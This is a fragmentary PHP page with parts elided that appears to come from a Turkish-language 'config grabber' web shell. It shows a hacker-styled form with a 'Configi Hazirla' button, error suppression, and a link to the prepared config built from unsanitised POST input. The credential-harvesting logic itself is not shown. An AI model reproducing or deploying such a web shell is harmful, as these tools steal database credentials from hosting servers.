...
<img src="https://cdn-images-1.medium.com/max/465/1*oL1HcSo5hPPGf9PW6heUvA.jpeg"</img><br>
<?php 
@error_reporting(0);
...
<input style="color:red;background-color:#000000" name="conf" size="10"
 value="Configi Hazirla" type="submit">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
...
echo '<i><b><a href='.$folfig.'>Configin Hazirdi Bas UStune!!!</a></b></i></center>';
}
?>
</td></table></body></html>